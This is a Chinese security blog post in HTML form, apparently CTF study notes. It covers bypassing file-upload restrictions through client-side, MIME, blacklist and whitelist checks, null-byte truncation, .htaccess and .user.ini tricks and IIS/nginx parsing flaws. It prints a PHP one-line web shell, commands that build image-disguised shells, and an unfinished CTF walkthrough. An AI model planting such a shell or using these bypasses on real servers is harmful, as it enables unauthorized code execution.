@@ -1,0 +1,428 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>文件上传 | zishuQ's blog</title><meta name="author" content="zishuQ"><meta name="copyright" content="zishuQ"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="基础知识1、一句话木马参考文章：(18条消息) Web安全-一句话木马_Tr0e的博客-CSDN博客_yijuhuamuma 1&lt;?php @eval($_POST[&amp;#x27;cmd&amp;#x27;]);?&gt;  2、绕过方式2.1、客户端检测绕过按F12打开网络检测，提交一个非法格式的文件，若没有请求数据发送出去，直接判断出是非法格式则是客户端检测。 如图，只在客户端前端对文件格式是否为">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件上传">
+<meta property="og:url" content="https://zishuq.github.io/article/web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/index.html">
+<meta property="og:site_name" content="zishuQ&#39;s blog">
+<meta property="og:description" content="基础知识1、一句话木马参考文章：(18条消息) Web安全-一句话木马_Tr0e的博客-CSDN博客_yijuhuamuma 1&lt;?php @eval($_POST[&amp;#x27;cmd&amp;#x27;]);?&gt;  2、绕过方式2.1、客户端检测绕过按F12打开网络检测，提交一个非法格式的文件，若没有请求数据发送出去，直接判断出是非法格式则是客户端检测。 如图，只在客户端前端对文件格式是否为">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/zishuQ/PicGo/img/202306302200952.jpg">
+<meta property="article:published_time" content="2023-06-30T09:46:54.000Z">
+<meta property="article:modified_time" content="2023-07-24T13:11:46.000Z">
+<meta property="article:author" content="zishuQ">
+<meta property="article:tag" content="zishuQ">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/zishuQ/PicGo/img/202306302200952.jpg"><link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/zishuQ/PicGo/img/202306302200952.jpg"><link rel="canonical" href="https://zishuq.github.io/article/web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '文件上传',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-07-24 21:11:46'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://cdn.jsdelivr.net/gh/zishuQ/PicGo/img/202306302200952.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">57</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">14</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">54</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/zishuQ/PicGo/img/202306302205350.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="zishuQ's blog"><img class="site-icon" src="https://cdn.jsdelivr.net/gh/zishuQ/PicGo/img/202306302200952.jpg"/><span class="site-name">zishuQ's blog</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">文件上传</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-06-30T09:46:54.000Z" title="发表于 2023-06-30 17:46:54">2023-06-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-07-24T13:11:46.000Z" title="更新于 2023-07-24 21:11:46">2023-07-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="文件上传"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="1、一句话木马"><a href="#1、一句话木马" class="headerlink" title="1、一句话木马"></a>1、一句话木马</h2><p>参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39190897/article/details/86772765">(18条消息) Web安全-一句话木马_Tr0e的博客-CSDN博客_yijuhuamuma</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="2、绕过方式"><a href="#2、绕过方式" class="headerlink" title="2、绕过方式"></a>2、绕过方式</h2><h3 id="2-1、客户端检测绕过"><a href="#2-1、客户端检测绕过" class="headerlink" title="2.1、客户端检测绕过"></a>2.1、客户端检测绕过</h3><p>按F12打开网络检测，提交一个非法格式的文件，若没有请求数据发送出去，直接判断出是非法格式则是客户端检测。</p>
+<p>如图，只在客户端前端对文件格式是否为满足条件的png、bmp、gif、jpg进行了校验。</p>
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">checkFile</span>(<span class="params"></span>)&#123;</span><br><span class="line">		<span class="keyword">var</span> flag = <span class="literal">false</span>;</span><br><span class="line">		<span class="keyword">var</span> str = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;file&quot;</span>).<span class="property">value</span>;</span><br><span class="line">		str = str.<span class="title function_">substring</span>(str.<span class="title function_">lastIndexOf</span>(<span class="string">&#x27;.&#x27;</span>) + <span class="number">1</span>);</span><br><span class="line">		<span class="keyword">var</span> arr = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;bmp&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>,<span class="string">&#x27;jpg&#x27;</span>);</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;arr.<span class="property">length</span>;i++)&#123;</span><br><span class="line">				<span class="keyword">if</span>(str==arr[i])&#123;</span><br><span class="line">						flag = <span class="literal">true</span>;</span><br><span class="line">				&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(!flag)&#123;</span><br><span class="line">				<span class="title function_">alert</span>(<span class="string">&#x27;文件不合法！&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">checkFile</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> file = <span class="variable language_">document</span>.<span class="title function_">getElementsByName</span>(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].<span class="property">value</span>;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        <span class="title function_">alert</span>(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.<span class="title function_">substring</span>(file.<span class="title function_">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.<span class="title function_">indexOf</span>(ext_name + <span class="string">&quot;|&quot;</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">        <span class="title function_">alert</span>(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>将.php后缀改为符合前段检测的.jsp，抓包修改后缀名为php即可绕过前端校验，如果是JS校验也可以选择禁用浏览器JS绕过。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zishuQ/PicGo/img/202306301529552.png" alt="Untitled"></p>
+<h3 id="2-2-服务端MIME绕过"><a href="#2-2-服务端MIME绕过" class="headerlink" title="2.2 服务端MIME绕过"></a>2.2 服务端MIME绕过</h3><p><strong>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的标准，用来表示文档、文件或字节流的性质和格式。</strong></p>
+<p>MIME检测的是数据包content-type字段。常见的图片格式的MIME类型有以下几种类型：</p>
+<p>PNG图像：image&#x2F;png</p>
+<p>GIF图形： image&#x2F;gif</p>
+<p>JPG图形：image&#x2F;jpeg</p>
+<p>如下，将Content-TYpe修改为符合MIME检测的image&#x2F;jpeg</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zishuQ/PicGo/img/202306301530934.png" alt="Untitled"></p>
+<p>之后用蚁剑进行连接。</p>
+<h3 id="2-3-服务端目录检测绕过"><a href="#2-3-服务端目录检测绕过" class="headerlink" title="2.3 服务端目录检测绕过"></a>2.3 服务端目录检测绕过</h3><p>在文件上传时，有的程序允许用户将文件放到指定的目录中，如果指定目录存在就将文件写入目录，不存在则先建立目录，然后写入。关键代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$upload_dir</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;upload_dir&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_dir</span>(<span class="variable">$upload_dir</span>)) &#123;</span><br><span class="line">		<span class="title function_ invoke__">mkdir</span>(<span class="variable">$upload_dir</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在HTML页面有一个隐藏的表单，它默认提交的文件夹名称为value的值，即”uploads”。代码如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;upload_dir.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">		选择上传文件:</span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;upload_dir&quot;</span> <span class="attr">value</span>=<span class="string">&quot;uploads&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;upload_file&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>利用：如果在上传文件的数据包中存在能操作上传路径的参数，可修改该参数配合解析漏洞getshell。</p>
+<p>如利用条件：php&lt;5.3.4 配置条件：php.ini：magic_quotos_gcp &#x3D; Off</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zishuQ/PicGo/img/202306301530935.png" alt="Untitled"></p>
+<p>存在可控制上传路径的参数可结合其他姿势上传绕过， 如下，POST头内存在可控制上传路径的save_path参数，结合%00主动设置上传文件命名格式</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zishuQ/PicGo/img/202306301530936.png" alt="Untitled"></p>
+<h2 id="3、黑名单"><a href="#3、黑名单" class="headerlink" title="3、黑名单"></a>3、黑名单</h2><h3 id="3-1、特殊文件名绕过"><a href="#3-1、特殊文件名绕过" class="headerlink" title="3.1、特殊文件名绕过"></a>3.1、特殊文件名绕过</h3><ol>
+<li><p>大小写绕过</p>
+</li>
+<li><p>空格绕过    </p>
+<p> 使用burp抓包后在文件名后面加个空格</p>
+</li>
+<li><p>在文件后面加上<code>.</code>     </p>
+<p>  对于windows系统，文件最后一个符号是<code>.</code>时会被丢弃</p>
+</li>
+<li><p>在文件名后面加上<code>. .</code>（点空格点）</p>
+</li>
+<li><p>在文件名后加上<code>::$DATA</code>    </p>
+<p>  <code>php+windows</code>的情况下：如果文件名+<code>::$DATA</code>会把<code>::$DATA</code>之后的数据当成文件流处理，不会检测后缀名。且保持<code>::$DATA</code>之前的文件名。利用windows特性，可在后缀名中加<code>::$DATA</code>绕过。 </p>
+</li>
+<li><p>双写绕过   </p>
+<p>  一些题目是把黑名单中的名字换成空格，则双写后缀名绕过</p>
+</li>
+<li><p>使用<code>%00</code>      </p>
+<p> 若修改上传路径为<code>./upload/1.php%00</code>，在后端会把上传路径与文件名进行拼接，然后%00会把后面的内容进行截断，从而修改文件名称。</p>
+</li>
+<li><p>使用<code>0x00</code>截断    </p>
+<p> 上传的文件名：在burp中修改空格的16进制把20改为00</p>
+</li>
+</ol>
+<h3 id="3-2-上传配置文件绕过"><a href="#3-2-上传配置文件绕过" class="headerlink" title="3.2 上传配置文件绕过"></a>3.2 上传配置文件绕过</h3><ol>
+<li><p><code>.htaccess</code>配置文件</p>
+<p> 条件：<code>Apache</code> 服务器</p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FileMatch &quot;自定义文件名&quot;&gt;</span><br><span class="line">SetHandler applicatioin/x-httpd-php</span><br><span class="line">&lt;/FileMatch&gt;</span><br></pre></td></tr></table></figure>
+<p> 只要上传的文件名包含自定义文件名，都会按照php来解析</p>
+</li>
+<li><p><code>.user.ini</code>配置文件（实用不大）</p>
+ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_perpend_file=1.jpg</span><br></pre></td></tr></table></figure>
+<p> 只要执行该目录下的php文件就包含1.jpg文件中的代码</p>
+<p> 1.先上传个.user.ini文件，再上传个1.jpg内容是<code>&lt;?php phpinfo();?&gt;</code></p>
+<p> 2.若上传目录中没有php文件则自己手动创建一个，空的php文件。</p>
+<p> 3.然后访问php文件就会执行1.jpg中的内容。</p>
+<p> 4.上传的文件只要含有.htaccess中自定义文件名就可以当作php来解析。</p>
+</li>
+</ol>
+<h2 id="4、漏洞解析"><a href="#4、漏洞解析" class="headerlink" title="4、漏洞解析"></a>4、漏洞解析</h2><h3 id="4-1-IIS解析漏洞"><a href="#4-1-IIS解析漏洞" class="headerlink" title="4.1 IIS解析漏洞"></a>4.1 <strong>IIS解析漏洞</strong></h3><p>IIS6.0有两个解析漏洞,一个是如果目录名包含.asp、.asa、 .cer字符串,那么这个目录下所有的文件都会按照asp去解析。eg: “test.asp&#x2F;1.jpg”另一个是只要文件名中含有.asp、 .asa、 .cer会优先按asp来解析eg: “1.asp; . jpg”.IIS7.0&#x2F; 7.5是对php解析时有一个类似于Nginx的解析漏洞 ，对任意文件名只要在URL后面追加上字符串”&#x2F;任意文件名.php”就会按照php的方式去解析。eg:“http:&#x2F; &#x2F;www. target. com&#x2F;upload&#x2F;1. jpg&#x2F;1. php”</p>
+<h3 id="4-2-nginx解析漏洞"><a href="#4-2-nginx解析漏洞" class="headerlink" title="4.2 nginx解析漏洞"></a>4.2 <strong>nginx解析漏洞</strong></h3><p>目前Nginx主要有这两种漏洞:</p>
+<p>1.对任意文件名,在后面添加&#x2F;任意文件名.php的解析漏洞,比如原本文件名是test.jpg可以添加为test.jpg&#x2F;x.php进行解析攻击。(实用)例如：<code>http://www.target.com/upload/1.jpg/1.php</code></p>
+<p>2.对低版本的Nginx可以在任意文件名后面添加%00.php(条件苛刻)例如：<code>http://www.target.com/up1oad/1.jpg%00.php</code></p>
+<p>对于nginx版本要求：nginx 0.5. ；nginx 0.6.*；nginx 0.7 &lt;&#x3D; 0.7 .65；nginx 0.8 &lt;&#x3D; 0.8.37</p>
+<h2 id="5、白名单"><a href="#5、白名单" class="headerlink" title="5、白名单"></a>5、白名单</h2><h3 id="5-1-0x00或-00截断"><a href="#5-1-0x00或-00截断" class="headerlink" title="5.1 0x00或%00截断"></a>5.1 0x00或%00截断</h3><p>同黑名单中的内容</p>
+<h3 id="5-2-利用文件包含漏洞"><a href="#5-2-利用文件包含漏洞" class="headerlink" title="5.2 利用文件包含漏洞"></a>5.2 利用文件包含漏洞</h3><p><strong>条件：</strong></p>
+<p>当一些文件上传漏洞waf比较难以绕过，只能使用图片名后缀但图片内容没有进行重新渲染时。</p>
+<p><strong>原理：</strong></p>
+<p>只要图片中存在可以执行的php语句，即使文件名是图片的格式，只要使用include(‘xxx,jpg’)；就可以把图片当做php文件来解析。所以若可以配合文件包含漏洞将是一击重拳，很实用的。</p>
+<h3 id="5-3-漏洞解析"><a href="#5-3-漏洞解析" class="headerlink" title="5.3 漏洞解析"></a>5.3 漏洞解析</h3><p><strong>IIS解析漏洞：</strong></p>
+<p>IIS6.0有两个解析漏洞,一个是如果目录名包.asp、.asa、 .cer字符串,那么这个目录下所有的文件都会按照asp去解析。eg: “test.asp&#x2F;1.jpg”另一个是只要文件名中含有.asp、 .asa、 .cer会优先按asp来解析eg: “1.asp; . jpg”.IIS7.0&#x2F; 7.5是对php解析时有一个类似于Nginx的解析漏洞 ，对任意文件名只要在URL后面追加上字符串”&#x2F;任意文件名.php”就会按照php的方式去解析。eg:“http:&#x2F; &#x2F;www. target. com&#x2F;upload&#x2F;1. jpg&#x2F;1. php”</p>
+<p><strong>nginx解析漏洞</strong></p>
+<p>目前Nginx主要有这两种漏洞:1.对任意文件名,在后面添加&#x2F;任意文件名.php的解析漏洞,比如原本文件名是test.jpg可以添加为test.jpg&#x2F;x.php进行解析攻击。(实用)例如：<code>http://www.target.com/upload/1.jpg/1.php</code>2.对低版本的Nginx可以在任意文件名后面添加%00.php(条件苛刻)例如：<code>http://www.target.com/up1oad/1.jpg%00.php</code>对于nginx版本要求：nginx 0.5. ；nginx 0.6.*；nginx 0.7 &lt;&#x3D; 0.7 .65；nginx 0.8 &lt;&#x3D; 0.8.37</p>
+<h3 id="5-4-文件内容检测"><a href="#5-4-文件内容检测" class="headerlink" title="5.4 文件内容检测"></a>5.4 文件内容检测</h3><p><strong>1.只检测文件头</strong></p>
+<p>php中一个检测函数getimagesize()：可以检测一张图片的文件头，从文件头中判断照片的类型。所以，仅仅修改文件的后缀名是绕不过的。可以打开一张正常的图片，用记事本打开后在后面或者中间插入php语法。</p>
+<p><strong>制作图片马</strong></p>
+<p>windows下命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy 1.png/b+shell.php/a 2.png</span><br></pre></td></tr></table></figure>
+
+<p>1.png是正常的图片，shell.php是木马 2.png是新生成的图片马。linux下命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> 1.png shell.php &gt;2.png</span><br></pre></td></tr></table></figure>
+
+<p><strong>2.对文件内容进行检测</strong></p>
+<p>可能考虑用户体验，只会检测前多少行内容，然后就可以一直重复文件内容，在后面加入脚本语言进行绕过。…&#x2F;…&#x2F;</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.18.129/dvwa/hackable/uploads/phpin.jpg</span><br><span class="line">http://192.168.18.129/dvwa/vulnerabilities/fi/?page=…/…/hackable/uploads/phpin.jpg</span><br><span class="line">http://192.168.18.129/dvwa/vulnerabilities/upload/</span><br></pre></td></tr></table></figure>
+
+<h1 id="例题巩固"><a href="#例题巩固" class="headerlink" title="例题巩固"></a>例题巩固</h1><h2 id="【Web-Level1】ez-upload"><a href="#【Web-Level1】ez-upload" class="headerlink" title="【Web Level1】ez_upload"></a><strong>【Web Level1】ez_upload</strong></h2><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a><strong>题目分析</strong></h3><ol>
+<li><p>打开题目之后提示我们上传文件, 上传一个我们提前写好的 php木马后, 出现提示</p>
+<p> <img src="https://cdn.jsdelivr.net/gh/zishuQ/PicGo/img/202306301530937.png" alt="3-1.png"></p>
+</li>
+<li><p>为了能成功上传木马, 我们需要把后缀 php先改为 gif</p>
+<p> <img src="https://cdn.jsdelivr.net/gh/zishuQ/PicGo/img/202306301530938.png" alt="3-2.png"></p>
+</li>
+</ol>
+<blockquote>
+<p>一句话木马内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;zishuQ&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+</blockquote>
+<ol>
+<li>此时我们再上传 zsq.gif, 提示上传成功, 并且得到了木马在服务器中的位置 uploads&#x2F;zsq.gif</li>
+</ol>
